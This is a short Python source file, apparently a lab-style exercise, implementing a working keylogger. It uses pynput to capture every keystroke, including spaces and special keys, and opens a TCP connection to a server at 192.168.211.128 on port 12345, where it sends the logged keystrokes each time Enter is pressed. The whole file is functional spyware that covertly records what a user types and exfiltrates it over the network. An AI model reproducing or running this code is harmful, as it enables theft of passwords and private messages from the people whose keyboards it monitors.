import socket
from pynput.keyboard import Key, Listener

# Create Socket and Connect to Host
server_host = "192.168.211.128"  # Replace with the IP address or hostname of the server
server_port = 12345  # Use the same port number as in server.py
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP socket object

try:
    s.connect((server_host, server_port))
except ConnectionRefusedError:
    print("Connection to the server failed. Make sure the server is running.")
    exit(1)

# Logstring is a string but will be treated like a char array.
# Logged key strokes will be added to logstring one by one.
# A loop will reinitialize logstring as "\n" after every send.
logstring = "\n"

# Keylog
def on_press(key):
    global logstring
    if key != Key.enter:
        if (str(key)).__contains__("Key."):
            if key == Key.space:
                logstring += " "
            else:
                if len(logstring) > 1:
                    logstring += "\n"
                    logstring += str(key).strip("'")
                else:
                    logstring += str(key).strip("'")
                    logstring += "\n"
        else:
            logstring += str(key).strip("'")
    else:
        s.sendall((logstring).encode('utf-8'))
        logstring = "\n"

with Listener(on_press=on_press) as listener:
    listener.join()
